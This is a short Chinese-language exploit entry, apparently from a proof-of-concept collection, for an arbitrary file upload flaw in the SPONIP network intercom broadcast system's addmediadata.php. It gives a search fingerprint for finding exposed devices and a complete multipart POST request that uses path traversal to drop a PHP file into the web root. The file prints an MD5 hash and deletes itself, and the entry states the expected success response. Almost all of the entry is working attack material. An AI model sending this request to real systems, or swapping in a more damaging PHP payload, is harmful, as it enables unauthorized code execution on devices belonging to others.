# 世邦通信SPONIP网络对讲广播系统addmediadata.php任意文件上传漏洞

- **系统**：世邦通信SPONIP网络对讲广播系统addmediadata.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="-1830859634"`
- **请求**：`POST /php/addmediadata.php HTTP/1.1`
- **关键头**：`Content-Length: 514`　`Content-Type: multipart/form-data; boundary=de3b7a45ced9f35720e192ff54eb83…`

**请求体 / payload**
```
--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
Content-Disposition: form-data; name="fullpath"
../
--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
Content-Disposition: form-data; name="subpath"
/
--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/octet-stream
<?php echo md5(1);unlink(__FILE__);?>
--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828--
访问路径：[http://127.0.0.1/test.php](http://127.0.0.1/test.php)
```
- **预期**：200　|　{"res":"1","file":"///test.php"}